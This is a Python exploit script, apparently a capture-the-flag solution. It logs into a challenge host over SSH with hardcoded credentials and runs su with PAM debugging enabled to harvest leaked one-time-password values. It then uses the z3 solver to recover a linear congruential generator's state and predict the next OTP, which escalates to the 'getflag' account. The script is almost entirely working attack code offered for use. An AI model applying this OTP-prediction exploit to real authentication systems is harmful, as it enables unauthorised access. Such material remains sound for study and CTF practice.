#!/usr/bin/python3

from pwn import *
import z3

s = ssh(host='109.233.56.94', user='user71', password='1e0566ff49', port=20022)

p = s.process(["/bin/su", "getflag"], env={"PAM_DEBUG": "1"})
p.sendlineafter(b"Password: ", b"Ohnai2phhie9eiGa")
dbg_vals = []

# the more the values, the more certain we will be of our answer
for i in range(9):
    p.sendlineafter(b"One Time Password:", b"123")
    p.recvuntil(b"OTP_DEBUG: ")
    dbg_vals.append(int(p.recvline().strip(), 16))
    log.debug(hex(dbg_vals[-1]))

ss = z3.Solver()
orig = z3.BitVec('x', 32)
ans = z3.BitVec('ans', 32)
x = orig

for dbg in dbg_vals:
    # x % 0x5f5e100 == ans
    ss.add(z3.URem(x, z3.BitVecVal(0x5F5E100, 32)) == z3.BitVecVal(dbg, 32))
    # x = x * 0x343fd + 0x269ec3
    x = z3.BitVecVal(0x343FD,32) * x + z3.BitVecVal(0x269EC3, 32)

ss.add(ans == z3.URem(x, z3.BitVecVal(0x5f5e100, 32)))

print(ss.check())
if ss.check() == z3.sat:
    print(ss.model()[ans].as_long())

p.interactive()
ss.interactive()
